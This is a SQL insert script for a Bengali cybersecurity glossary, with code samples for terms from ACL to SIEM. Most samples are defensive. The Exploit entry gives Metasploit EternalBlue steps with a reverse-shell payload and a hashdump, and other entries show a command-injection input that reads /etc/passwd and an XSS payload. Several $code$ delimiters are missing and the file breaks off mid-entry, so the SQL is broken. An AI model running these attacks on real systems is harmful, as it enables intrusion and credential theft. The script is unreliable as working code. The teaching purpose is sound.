-- ============================================================
-- CyberSec Dictionary — Additional 76 Terms (Total: 100)
-- Supabase SQL Editor → paste করুন → Run
-- ============================================================

INSERT INTO public.cyber_terms
  (letter, term, short, analogy, definition, use_case, example, code, tags, risk, category, image)
VALUES

-- ═══════════════════════════════════════════════════════
-- A
-- ═══════════════════════════════════════════════════════
('A','Access Control List (ACL)','কে কোথায় যেতে পারবে তার তালিকা',
 '📋 দারোয়ানের খাতায় লেখা — কোন নাম থাকলে ঢুকতে পারবে।',
 'ACL হলো একটি তালিকা যা নির্দিষ্ট করে কোন user বা system কোন resource-এ কী ধরনের access পাবে (read/write/execute)। Network ACL ও File system ACL দুই ধরন।',
 'Router-এ কোন IP ব্লক করবে, ফাইল সিস্টেমে কে read করতে পারবে।',
 'AWS S3 bucket-এ ACL দিয়ে নির্দিষ্ট IP range থেকেই শুধু access দেওয়া।',
 $code$# Linux File ACL
setfacl -m u:akib:rw sensitive_file.txt
getfacl sensitive_file.txt

# AWS S3 Bucket Policy (JSON)
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::123:user/akib" },
    "Action": ["s3:GetObject"],
    "Resource": "arn:aws:s3:::my-bucket/*"
  }]
}$code$,
 ARRAY['access-control','permissions','network','AWS','Linux'],
 'medium','Access Control',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('A','Advanced Persistent Threat (APT)','দীর্ঘমেয়াদী লুকানো সাইবার আক্রমণ',
 '🕵️ একজন গোয়েন্দা মাসের পর মাস ছদ্মবেশে লুকিয়ে তথ্য সংগ্রহ করছে।',
 'APT হলো অত্যন্ত sophisticated, দীর্ঘমেয়াদী সাইবার আক্রমণ — সাধারণত nation-state বা বড় হ্যাকার গ্রুপের দ্বারা পরিচালিত। লক্ষ্য হলো দীর্ঘদিন লুকিয়ে থেকে তথ্য চুরি।',
 'সরকারি সংস্থা, প্রতিরক্ষা কোম্পানি, critical infrastructure আক্রমণ।',
 'APT28 (Fancy Bear) — রাশিয়ান গ্রুপ যারা US election infrastructure আক্রমণ করেছিল।',
 $code$# APT Detection — Log Analysis (Python)
import re
from collections import defaultdict

def detect_apt_indicators(log_file):
    indicators = defaultdict(list)
    with open(log_file) as f:
        for line in f:
            # দীর্ঘসময় ধরে low-and-slow scanning
            if re.search(r'FAILED.*ssh', line, re.I):
                indicators['ssh_brute'].append(line.strip())
            # অস্বাভাবিক সময়ে access (রাত ২-৫টা)
            if re.search(r'0[2-5]:\d{2}:\d{2}', line):
                indicators['odd_hours'].append(line.strip())
            # Data exfiltration চেষ্টা
            if re.search(r'bytes_sent.*[5-9]\d{6}', line):
                indicators['large_transfer'].append(line.strip())
    return dict(indicators)

print(detect_apt_indicators('/var/log/auth.log'))$code$,
 ARRAY['nation-state','espionage','lateral-movement','persistence'],
 'critical','Threat Actor',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('A','Antivirus / EDR','ম্যালওয়্যার সনাক্তকরণ ও প্রতিরোধ সফটওয়্যার',
 '💉 শরীরের ইমিউন সিস্টেমের মতো — ভাইরাস দেখলে আক্রমণ করে।',
 'Antivirus সিগনেচার-ভিত্তিক malware সনাক্ত করে। আধুনিক EDR (Endpoint Detection & Response) behavioral analysis দিয়ে unknown threat-ও ধরতে পারে।',
 'Workstation সুরক্ষা, malware quarantine, real-time scanning।',
 'CrowdStrike Falcon EDR একটি zero-day malware behaviorally সনাক্ত করে ব্লক করল।',
 $code$# Custom Signature-based Scanner (Python)
import hashlib, os

# Known malware hashes (MD5)
BAD_HASHES = {
    "44d88612fea8a8f36de82e1278abb02f": "EICAR Test Virus",
    "ab5b649c9b3b9345d9fb89e2637bdb59": "WannaCry variant",
}

def scan_file(filepath):
    with open(filepath, 'rb') as f:
        h = hashlib.md5(f.read()).hexdigest()
    if h in BAD_HASHES:
        print(f"🚨 MALWARE: {BAD_HASHES[h]} → {filepath}")
        return True
    return False

def scan_directory(path):
    for root, _, files in os.walk(path):
        for fname in files:
            scan_file(os.path.join(root, fname))$code$,
 ARRAY['endpoint','malware','EDR','signature','behavioral'],
 'low','Defense',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- B
-- ═══════════════════════════════════════════════════════
('B','Bug Bounty','নিরাপত্তা ত্রুটি খুঁজে পুরস্কার',
 '🏆 পুলিশ যেমন অপরাধীর তথ্যের জন্য পুরস্কার দেয় — কোম্পানিও bug-এর জন্য দেয়।',
 'Bug Bounty Program হলো কোম্পানির নিজস্ব সিস্টেমে vulnerability খুঁজে দেওয়ার বিনিময়ে ethical hacker-দের অর্থ পুরস্কার দেওয়ার কর্মসূচি।',
 'Facebook, Google, Microsoft — সব বড় কোম্পানিই bug bounty চালায়।',
 'একজন বাংলাদেশি researcher Google-এ XSS bug খুঁজে $10,000 পেয়েছেন।',
 $code$# Bug Bounty Report Template (Markdown)

## Vulnerability Report
**Severity:** Critical / High / Medium / Low
**CWE:** CWE-79 (XSS) / CWE-89 (SQLi) / ...
**CVSS Score:** 9.8

## Description
XSS found in /search?q= parameter

## Steps to Reproduce
1. Navigate to https://target.com/search
2. Input: <script>alert(document.domain)</script>
3. Observe: Alert popup with domain

## Impact
Attacker can steal session cookies of any user.

## Proof of Concept
[Screenshot / Video]

## Remediation
Escape user input using DOMPurify or textContent$code$,
 ARRAY['ethical-hacking','rewards','HackerOne','Bugcrowd','responsible-disclosure'],
 'low','Ethical Hacking',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

('B','Buffer Overflow','মেমোরি সীমা অতিক্রম করে কোড চালানো',
 '🥛 গ্লাসের বাইরে পানি উপচে পড়লে যেমন ক্ষতি হয় — মেমোরিতেও তাই।',
 'Buffer Overflow হলো এমন দুর্বলতা যেখানে attacker নির্ধারিত বাফারের বাইরে ডেটা লিখে adjacent মেমোরি overwrite করে — ফলে arbitrary code execution সম্ভব হয়।',
 'Legacy C/C++ সফটওয়্যার exploit, privilege escalation, remote code execution।',
 'Morris Worm (1988) — প্রথম internet worm, gets() buffer overflow exploit করেছিল।',
 $code$// Buffer Overflow Example & Prevention (C)

// ❌ Vulnerable
void vuln_func(char *input) {
    char buf[64];
    strcpy(buf, input); // বাফার চেক নেই!
}

// ✅ Safe
void safe_func(char *input) {
    char buf[64];
    strncpy(buf, input, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
}

// Modern Prevention:
// - Stack Canaries: gcc -fstack-protector
// - ASLR: /proc/sys/kernel/randomize_va_space = 2
// - DEP/NX: non-executable stack
// - Use memory-safe languages: Rust, Go$code$,
ARRAY['memory','exploit','C','stack','heap','RCE'],
'critical','Vulnerability',
'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- C
-- ═══════════════════════════════════════════════════════
('C','Certificate Authority (CA)','ডিজিটাল পরিচয়পত্র যাচাইকারী',
 '🏛️ পাসপোর্ট অফিসের মতো — সরকার পরিচয় নিশ্চিত করে সার্টিফিকেট দেয়।',
 'Certificate Authority হলো একটি trusted তৃতীয় পক্ষ যা SSL/TLS সার্টিফিকেট ইস্যু করে — নিশ্চিত করে যে একটি ওয়েবসাইট সত্যিই সে যা দাবি করছে।',
 'HTTPS সার্টিফিকেট, code signing, email encryption (S/MIME)।',
 'DigiCert, Let''s Encrypt — এরাই বেশিরভাগ ওয়েবসাইটের SSL সার্টিফিকেট দেয়।',
 $code$# Let's Encrypt SSL Certificate (Free)

# Certbot ইনস্টল করুন
sudo apt install certbot python3-certbot-nginx

# Certificate নিন (Nginx)
sudo certbot --nginx -d example.com -d www.example.com

# Auto-renewal setup
sudo crontab -e
# 0 12 * * * /usr/bin/certbot renew --quiet

# Certificate তথ্য দেখুন
openssl x509 -in /etc/ssl/cert.pem -text -noout

# Self-signed certificate তৈরি (Development)
openssl req -x509 -newkey rsa:4096 \
  -keyout key.pem -out cert.pem \
  -days 365 -nodes$code$,
 ARRAY['PKI','SSL','TLS','HTTPS','Let''s Encrypt'],
 'medium','Cryptography',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('C','Cloud Security','ক্লাউড পরিবেশের নিরাপত্তা',
 '☁️ ব্যাংকের vault cloud-এ রাখলেও তালার দরকার হয়।',
 'Cloud Security হলো cloud computing environment রক্ষার practices, policies ও technologies। Shared Responsibility Model — provider infrastructure, customer data/access রক্ষা করে।',
 'AWS, Azure, GCP-এ data protection, IAM, compliance।',
 'Capital One 2019 data breach — misconfigured AWS S3 bucket, ১০০M+ customer data exposed।',
 $code$# AWS Security Best Practices

# 1. S3 Public Access Block করুন
aws s3api put-public-access-block \
  --bucket my-bucket \
  --public-access-block-configuration \
  BlockPublicAcls=true,BlockPublicPolicy=true

# 2. CloudTrail logging চালু করুন
aws cloudtrail create-trail \
  --name my-trail \
  --s3-bucket-name my-log-bucket

# 3. IAM Least Privilege Check
aws iam get-account-authorization-details \
  | python3 -c "import json,sys; \
    [print(u['UserName']) for u in json.load(sys.stdin)['UserDetailList']]"$code$,
 ARRAY['AWS','Azure','GCP','IAM','S3','shared-responsibility'],
 'high','Cloud Security',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('C','CVE (Common Vulnerabilities and Exposures)','পরিচিত নিরাপত্তা দুর্বলতার তালিকা',
 '📰 অপরাধীদের Most Wanted পোস্টারের মতো — প্রতিটি vulnerability-র আলাদা ID।',
 'CVE হলো publicly disclosed cybersecurity vulnerabilities-এর standardized identifier system। CVE-YYYY-NNNNN format। NVD (National Vulnerability Database) CVSS score দিয়ে severity রেট করে।',
 'Patch management, vulnerability scanning, risk prioritization।',
 'CVE-2021-44228 — Log4Shell, CVSS 10.0, Apache Log4j-এ critical RCE।',
 $code$# CVE Check Script (Python)
import requests

def check_cve(cve_id):
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
    resp = requests.get(url, timeout=10)
    data = resp.json()
    
    cve = data['vulnerabilities'][0]['cve']
    desc = cve['descriptions'][0]['value']
    
    metrics = cve.get('metrics', {})
    cvss = metrics.get('cvssMetricV31', [{}])[0]
    score = cvss.get('cvssData', {}).get('baseScore', 'N/A')
    
    print(f"CVE: {cve_id}")
    print(f"Score: {score}/10")
    print(f"Description: {desc[:200]}...")

check_cve("CVE-2021-44228")  # Log4Shell$code$,
 ARRAY['vulnerability','NVD','CVSS','patch','Log4Shell'],
 'high','Vulnerability',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('C','Command Injection','OS কমান্ড inject করার আক্রমণ',
 '📞 ফোনে অর্ডার দেওয়ার সময় লুকিয়ে অন্য নির্দেশ ঢুকিয়ে দেওয়া।',
 'Command Injection হলো এমন vulnerability যেখানে attacker user input-এর মাধ্যমে সার্ভারে arbitrary OS command execute করাতে পারে।',
 'Web application-এ ping/nslookup feature, file processing script।',
 'ping.php?host=8.8.8.8;cat /etc/passwd — সার্ভারের পাসওয়ার্ড ফাইল দেখা।',
 $code$// Command Injection Prevention (Node.js)
const { execFile } = require('child_process');

// ❌ Vulnerable
const { exec } = require('child_process');
exec(`ping -c 1 ${userInput}`, callback); // DANGEROUS!

// ✅ Safe: execFile with args array
function safePing(host) {
  // Whitelist validation
  const ipPattern = /^[\d.]+$/;
  if (!ipPattern.test(host))
    throw new Error('Invalid IP address');
  
  execFile('ping', ['-c', '1', host], (err, stdout) => {
    if (err) return console.error('Ping failed');
    console.log(stdout);
  });
}

safePing('8.8.8.8');$code$,
 ARRAY['injection','OS','RCE','OWASP','shell'],
 'critical','Web Security',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- D
-- ═══════════════════════════════════════════════════════
('D','Data Breach','ব্যক্তিগত তথ্য অননুমোদিতভাবে ফাঁস',
 '💧 বাঁধ ভেঙে পানি বেরিয়ে যাওয়ার মতো — ডেটা একবার বের হলে ফেরানো যায় না।',
 'Data Breach হলো এমন ঘটনা যেখানে confidential ডেটা অননুমোদিতভাবে access, theft বা expose হয়। Financial, healthcare, personal data সবচেয়ে বেশি targeted।',
 'Customer database চুরি, healthcare record ফাঁস, credit card data theft।',
 'Yahoo 2013 breach — ৩ billion অ্যাকাউন্টের ডেটা চুরি, ইতিহাসের সবচেয়ে বড়।',
 $code$// Breach Detection & Response (Node.js)
const crypto = require('crypto');

// Email breach check (HaveIBeenPwned API)
async function checkBreached(email) {
  // SHA-1 hash-এর প্রথম ৫ char
  const hash = crypto.createHash('sha1')
    .update(email.toLowerCase()).digest('hex').toUpperCase();
  const prefix = hash.slice(0, 5);
  const suffix = hash.slice(5);
  
  const resp = await fetch(
    `https://api.pwnedpasswords.com/range/${prefix}`,
    { headers: { 'Add-Padding': 'true' } }
  );
  const text = await resp.text();
  
  const found = text.split('\r\n')
    .some(line => line.startsWith(suffix));
  
  return { email, breached: found };
}

checkBreached('test@example.com').then(console.log);$code$,
 ARRAY['data-loss','privacy','GDPR','incident-response','PII'],
 'critical','Incident Response',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

('D','DNS Spoofing / Cache Poisoning','ডোমেইন নামের ভুয়া উত্তর দেওয়া',
 '🗺️ মানচিত্রে ভুল ঠিকানা লিখে দেওয়া — গন্তব্যে না গিয়ে ফাঁদে পড়বে।',
 'DNS Spoofing হলো DNS resolver-এর cache-এ ভুয়া DNS records ঢুকিয়ে দেওয়া, ফলে ব্যবহারকারী সঠিক সাইটের বদলে attacker-controlled সাইটে যায়।',
 'Phishing site redirect, malware distribution, credential harvesting।',
 'bank.com টাইপ করলে fake bank site খুলছে — DNS cache poisoned।',
 $code$# DNSSEC দিয়ে DNS Spoofing প্রতিরোধ

# DNS query সঠিক কিনা যাচাই (Python)
import dns.resolver
import dns.dnssec

def verify_dnssec(domain):
    try:
        resolver = dns.resolver.Resolver()
        resolver.use_dnssec = True
        answer = resolver.resolve(domain, 'A',
                                  raise_on_no_answer=False)
        print(f"✅ {domain} — DNSSEC Valid")
    except dns.exception.DNSException as e:
        print(f"⚠️ {domain} — {e}")

verify_dnssec('google.com')

# Cloudflare 1.1.1.1 বা Google 8.8.8.8 ব্যবহার করুন
# উভয়ই DNSSEC ও DoH (DNS over HTTPS) সাপোর্ট করে$code$,
 ARRAY['DNS','DNSSEC','redirect','cache','network'],
 'high','Network Attack',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('D','Dark Web','লুকানো ইন্টারনেটের জগৎ',
 '🌑 শহরের আন্ডারগ্রাউন্ড বাজারের মতো — সাধারণ মানুষ জানে না, বিশেষ পথে যেতে হয়।',
 'Dark Web হলো internet-এর এমন অংশ যা standard browser দিয়ে accessible নয়। Tor browser দিয়ে .onion sites access করা হয়। illegal বাজার থেকে শুরু করে whistleblower platform পর্যন্ত।',
 'Stolen data বিক্রি, malware বাজার, anonymous communication।',
 'Have I Been Pwned — Dark Web-এ পাওয়া চুরি হওয়া credentials track করে।',
 $code$# Dark Web Monitoring (Python)
# চুরি হওয়া credentials monitor করুন
import requests
import hashlib

def check_password_pwned(password):
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    resp = requests.get(f'https://api.pwnedpasswords.com/range/{prefix}')
    for line in resp.text.splitlines():
        hash_suffix, count = line.split(':')
        if hash_suffix == suffix:
            return int(count)
    return 0

count = check_password_pwned('password123')
if count:
    print(f"Password pwned {count:,} times!")
else:
    print("Password not found in breaches")
ARRAY['Tor','onion','anonymity','OSINT','threat-intel'],
'high','Threat Intelligence',
'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- E
-- ═══════════════════════════════════════════════════════
('E','Exploit','নিরাপত্তা ত্রুটি ব্যবহার করার কোড',
 '🗝️ তালার ত্রুটি ব্যবহার করে বিশেষ চাবি ছাড়াই দরজা খোলা।',
 'Exploit হলো কোড বা technique যা কোনো software vulnerability কে attack করতে ব্যবহার করা হয়। Zero-day exploit সবচেয়ে বিপজ্জনক।',
 'Penetration testing, CTF competitions, malware development।',
 'EternalBlue exploit — NSA তৈরি, WannaCry ransomware এটি ব্যবহার করেছিল।',
# Metasploit Framework (Ethical Hacking)
# শুধুমাত্র authorized systems-এ ব্যবহার করুন!

# Metasploit চালু করুন
msfconsole

# EternalBlue exploit খুঁজুন
search eternalblue

# Exploit সেট করুন
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100  # Target IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50   # আপনার IP

# Run
exploit

# Meterpreter shell পেলে:
sysinfo
getuid
hashdump  # Password hashes$code$,
 ARRAY['Metasploit','EternalBlue','RCE','pentest','CVE'],
 'critical','Attack Vector',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- F
-- ═══════════════════════════════════════════════════════
('F','Forensics (Digital)','ডিজিটাল প্রমাণ সংগ্রহ ও বিশ্লেষণ',
 '🔬 অপরাধ দৃশ্যে আঙুলের ছাপ খোঁজার মতো — ডিজিটাল প্রমাণ খোঁজা।',
 'Digital Forensics হলো digital devices থেকে প্রমাণ সংগ্রহ, সংরক্ষণ ও বিশ্লেষণের বিজ্ঞান। আদালতে গ্রহণযোগ্য হওয়া জরুরি।',
 'Cybercrime তদন্ত, incident response, corporate investigation।',
 'SolarWinds hack তদন্তে forensic analysts malware-এর TTPs বিশ্লেষণ করে attribution নির্ধারণ করেছিল।',
 $code$# Digital Forensics — Disk Imaging

# Evidence disk-এর exact copy (dd)
sudo dd if=/dev/sdb of=/evidence/disk.img \
  bs=4096 conv=noerror,sync

# Hash দিয়ে integrity যাচাই করুন
sha256sum /dev/sdb > original.hash
sha256sum /evidence/disk.img > copy.hash
diff original.hash copy.hash

# Autopsy দিয়ে বিশ্লেষণ (GUI)
# Deleted files recover করুন
# Browser history, email দেখুন

# Volatility দিয়ে Memory Forensics
volatility -f memory.dmp imageinfo
volatility -f memory.dmp --profile=Win10x64 pslist
volatility -f memory.dmp --profile=Win10x64 netscan$code$,
 ARRAY['investigation','evidence','Autopsy','Volatility','incident'],
 'medium','Incident Response',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('F','Fuzzing','এলোমেলো ইনপুট দিয়ে bug খোঁজা',
 '🎲 হাজারো র্যান্ডম চাবি চেষ্টা করে কোন দরজা খোলে দেখা।',
 'Fuzzing হলো automated testing technique যেখানে software-এ random, unexpected বা invalid input দিয়ে crash, memory leak বা vulnerability খোঁজা হয়।',
 'Browser, OS, parser, protocol implementation testing।',
 'Google Project Zero AFL fuzzer দিয়ে Chrome-এ শত শত vulnerability খুঁজেছে।',
 $code$# AFL++ Fuzzing Setup

# Target program compile করুন
afl-cc -o target target.c

# Fuzzing শুরু করুন
afl-fuzz -i input_seeds/ -o output/ ./target @@

# Python দিয়ে Simple Fuzzer
import subprocess, random, string

def fuzz_program(binary, iterations=1000):
    crashes = []
    for i in range(iterations):
        # Random input generate
        payload = ''.join(
            random.choices(string.printable, k=random.randint(1,1000))
        )
        try:
            result = subprocess.run(
                [binary], input=payload.encode(),
                capture_output=True, timeout=5
            )
            if result.returncode < 0:
                crashes.append(payload)
                print(f"Crash #{len(crashes)}")
        except subprocess.TimeoutExpired:
            print("Timeout")
    return crashes,
 ARRAY['testing','AFL','bug-hunting','automated','vulnerability'],
 'medium','Security Testing',
 'https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- I
-- ═══════════════════════════════════════════════════════
('I','Incident Response','সাইবার আক্রমণে সাড়া দেওয়ার পরিকল্পনা',
 '🚒 আগুন লাগলে দমকল বাহিনীর মতো — দ্রুত, সংগঠিত, ক্ষতি কমানো।',
 'Incident Response হলো সাইবার আক্রমণ বা breach-এ সংগঠিতভাবে সাড়া দেওয়ার process। NIST IR Lifecycle: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned।',
 'Data breach, ransomware attack, insider threat যেকোনো incident-এ।',
 'Equifax 2017 breach — IR team দেরিতে সাড়া দিয়ে $575M penalty পেয়েছিল।',
# Incident Response Checklist (Python)
import datetime, json

class IncidentResponse:
    def __init__(self, incident_type):
        self.incident = {
            "id": f"IR-{datetime.date.today().strftime('%Y%m%d')}-001",
            "type": incident_type,
            "timestamp": datetime.datetime.now().isoformat(),
            "status": "open",
            "phases": []
        }
    
    def add_phase(self, phase, actions):
        self.incident["phases"].append({
            "phase": phase,
            "timestamp": datetime.datetime.now().isoformat(),
            "actions": actions
        })
    
    def generate_report(self):
        return json.dumps(self.incident, indent=2, ensure_ascii=False)

ir = IncidentResponse("Ransomware")
ir.add_phase("Detection", ["Alert received from EDR", "Initial triage completed"])
ir.add_phase("Containment", ["Isolated affected systems", "Blocked C2 IPs"])
print(ir.generate_report())$code$,
 ARRAY['NIST','playbook','CIRT','forensics','recovery'],
 'high','Incident Response',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

('I','Identity and Access Management (IAM)','পরিচয় ও অ্যাক্সেস পরিচালনা',
 '🎫 অফিসের visitor badge সিস্টেমের মতো — কে কোথায় যেতে পারবে নিয়ন্ত্রণ।',
 'IAM হলো policies ও technologies-এর framework যা সঠিক মানুষকে সঠিক resource-এ সঠিক সময়ে access দেয়। SSO, MFA, RBAC, ABAC সব IAM-এর অংশ।',
 'Enterprise user management, cloud access control, compliance।',
 'Okta IAM দিয়ে ১০,০০০ কর্মীর সব SaaS app-এ Single Sign-On।',
 $code$// IAM Implementation (Node.js + JWT)
const jwt = require('jsonwebtoken');

// IAM Middleware
const iam = {
  // Permission matrix
  permissions: {
    admin:    ['read','write','delete','admin'],
    manager:  ['read','write'],
    employee: ['read'],
    guest:    []
  },
  
  // Check permission
  can: (role, action) => {
    return iam.permissions[role]?.includes(action) ?? false;
  },
  
  // Middleware
  require: (action) => (req, res, next) => {
    const { role } = req.user;
    if (iam.can(role, action)) return next();
    res.status(403).json({ error: `${action} not allowed for ${role}` });
  }
};

app.delete('/users/:id',
  authenticate,
  iam.require('delete'),
  deleteUserHandler
);$code$,
 ARRAY['SSO','RBAC','Okta','Azure-AD','privilege'],
 'high','Identity',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

('I','Insider Threat','ভেতর থেকে বিপদ',
 '🐍 বিশ্বস্ত কাউকে বাড়ির চাবি দিলে সে যদি চুরি করে — সেটাই insider threat।',
 'Insider Threat হলো organization-এর বর্তমান বা সাবেক কর্মী, contractor বা partner যারা intentionally বা accidentally security-কে ক্ষতিগ্রস্ত করে।',
 'Data theft, sabotage, accidental misconfiguration।',
 'Edward Snowden — NSA contractor, classified documents ফাঁস করেছিলেন।',
 $code$# Insider Threat Detection — UEBA (User Behavior Analytics)
import statistics
from datetime import datetime

class UserBehaviorMonitor:
    def __init__(self):
        self.baselines = {}  # Normal behavior profiles
    
    def update_baseline(self, user, metric, value):
        if user not in self.baselines:
            self.baselines[user] = {}
        if metric not in self.baselines[user]:
            self.baselines[user][metric] = []
        self.baselines[user][metric].append(value)
    
    def detect_anomaly(self, user, metric, current_value):
        if user not in self.baselines:
            return False
        values = self.baselines[user].get(metric, [])
        if len(values) < 10: return False
        mean = statistics.mean(values)
        std = statistics.stdev(values)
        z_score = abs(current_value - mean) / (std + 0.001)
        if z_score > 3.0:  # 3 sigma rule
            print(f"🚨 Anomaly: {user} {metric}={current_value} (z={z_score:.1f})")
            return True
        return False$code$,
 ARRAY['UEBA','DLP','monitoring','employee','sabotage'],
 'high','Threat Actor',
 'https://images.unsplash.com/photo-1563986768609-322da13575f3?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- J
-- ═══════════════════════════════════════════════════════
('J','JWT (JSON Web Token)','ডিজিটাল পরিচয়পত্র টোকেন',
 '🎟️ কনসার্টের টিকেটের মতো — ভেতরে তথ্য আছে, যাচাই করা যায়, কাউকে চিনতে হয় না।',
 'JWT হলো তিন অংশের (header.payload.signature) digitally signed token। Stateless authentication-এ ব্যবহার হয় — server-side session রাখতে হয় না।',
 'API authentication, mobile app, microservices।',
 'REST API-তে প্রতিটি request-এর Authorization header-এ Bearer JWT।',
 $code$// JWT Deep Dive (Node.js)
const jwt = require('jsonwebtoken');

const SECRET = process.env.JWT_SECRET;

// Token তৈরি
function createToken(user) {
  return jwt.sign(
    { 
      sub: user.id,
      email: user.email,
      role: user.role,
      iat: Math.floor(Date.now() / 1000)
    },
    SECRET,
    { expiresIn: '15m' }  // Short-lived!
  );
}

// Refresh Token pattern
function createRefreshToken(userId) {
  return jwt.sign({ sub: userId }, SECRET, { expiresIn: '7d' });
}

// Verify middleware
const verifyJWT = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  try {
    req.user = jwt.verify(token, SECRET);
    next();
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// ⚠️ JWT Pitfalls:
// - Algorithm confusion: alg:none attack
// - Store in httpOnly cookie, not localStorage
// - Short expiry + refresh token pattern$code$,
 ARRAY['token','stateless','API','OAuth','Bearer'],
 'medium','Identity',
 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- K
-- ═══════════════════════════════════════════════════════
('K','Keylogger','কীবোর্ডের প্রতিটি চাপ রেকর্ড করা',
 '👀 কেউ পেছন থেকে তুমি কী টাইপ করছ সব দেখছে ও লিখে রাখছে।',
 'Keylogger হলো software বা hardware যা keyboard-এর প্রতিটি keystroke রেকর্ড করে attacker-এর কাছে পাঠায়। পাসওয়ার্ড, credit card number সব capture হয়।',
 'Credential theft, corporate espionage, parental monitoring।',
 'Phishing email-এর attachment খুলতেই keylogger install হয়ে সব পাসওয়ার্ড চলে যাচ্ছে।',
 $code$# Keylogger Detection (Windows — Python)
import subprocess

def check_suspicious_processes():
    # Known keylogger process names
    keylogger_indicators = [
        'ardamax', 'refog', 'spyrix', 'revealer'
    ]
    result = subprocess.run(
        ['tasklist', '/FO', 'CSV'],
        capture_output=True, text=True
    )
    for line in result.stdout.lower().split('\n'):
        for indicator in keylogger_indicators:
            if indicator in line:
                print(f"⚠️ Potential keylogger: {line.strip()}")

# Prevention:
# ✅ Virtual keyboard ব্যবহার করুন sensitive site-এ
# ✅ Browser password manager ব্যবহার করুন
# ✅ 2FA চালু রাখুন
# ✅ Regular antivirus scan
# ✅ Public computer-এ sensitive login এড়িয়ে চলুন
check_suspicious_processes()$code$,
 ARRAY['spyware','malware','surveillance','credential','hardware'],
 'high','Malware',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=600&q=80'),

-- ═══════════════════════════════════════════════════════
-- L
-- ═══════════════════════════════════════════════════════
('L','Lateral Movement','নেটওয়ার্কে ছড়িয়ে পড়া',
 '🐍 একটি ঘরে ঢুকে ধীরে ধীরে পুরো বাড়িতে ছড়িয়ে পড়া।',
 'Lateral Movement হলো attacker একটি system compromise করার পরে network-এ অন্য systems-এ ছড়িয়ে পড়ার technique। Pass-the-Hash, PsExec, RDP commonly ব্যবহার হয়।',
 'APT attacks-এ initial access থেকে domain controller পর্যন্ত পৌঁছানো।',
 'NotPetya ransomware EternalBlue দিয়ে পুরো network-এ ছড়িয়ে পড়েছিল।',
 $code$# Lateral Movement Detection (Python)
import subprocess, re

def detect_lateral_movement():
    # Windows Event Log চেক
    suspicious_events = {
        4624: "Successful Logon",
        4625: "Failed Logon",
        4648: "Logon with explicit credentials",  # PtH indicator
        4672: "Admin logon",
        7045: "New service installed"  # PsExec indicator
    }
    
    for event_id, desc in suspicious_events.items():
        cmd = f'wevtutil qe Security /q:"*[System[EventID={event_id}]]" /c:5 /f:text'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        if result.stdout:
            print(f"📋 Event {event_id} ({desc}): Found recent entries")

# Network Segmentation দিয়ে lateral movement সীমিত করুন
# Zero Trust Architecture implement করুন$code$,
 ARRAY['pivot','Pass-the-Hash','PsExec','network','APT'],
 'critical','Attack Vector',
 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=600&q=80'),

('L','Log Management / SIEM','নিরাপত্তা লগ সংগ্রহ ও বিশ্লেষণ',
 '📹 সিসিটিভি ফুটেজের মতো — সব ঘটনা রেকর্ড থাকে, পরে বিশ্লেষণ করা যায়।',
 'SIEM (Security Information and Event Management) হলো বিভিন্ন source থেকে security log সংগ্রহ করে real-time analysis ও alerting করার platform।',
 'Compliance (PCI-DSS, HIPAA), incident detection, forensic investigation।',
 'Splunk SIEM ব্যবহার করে Bank of America প্রতিদিন ৩০০ billion event analyze করে।',
 $code$# ELK Stack Log Analysis (Python)
from elasticsearch import Elasticsearch
from datetime import datetime, timedelta

es = Elasticsearch(['http://localhost:9200'])

# Failed login attempts detect করুন
def detect_brute_force(threshold=10, window_minutes=5):
    query = {
        "query": {
            "bool": {
                "must": [
                    {"match": {"event.action": "failed_login"}},
                    {"range": {
                        "@timestamp": {
                            "gte": f"now-{window_minutes}m",
                            "lt": "now"
                        }
                    }}
                ]
            }
        },
        "aggs": {
            "by_ip": {
                "terms": { "field": "source.ip", "min_doc_count": threshold }
            }
        }
    }
    result = es.search(index="logs-*", body=query)
    for bucket in result['aggregations']['by_ip']['buckets']:
        print(f"🚨 Brute force from {bucket['key']}: {bucket['doc_count']} attempts")$code$,
 ARRAY['Splunk','ELK','logging','monitoring','compliance'],
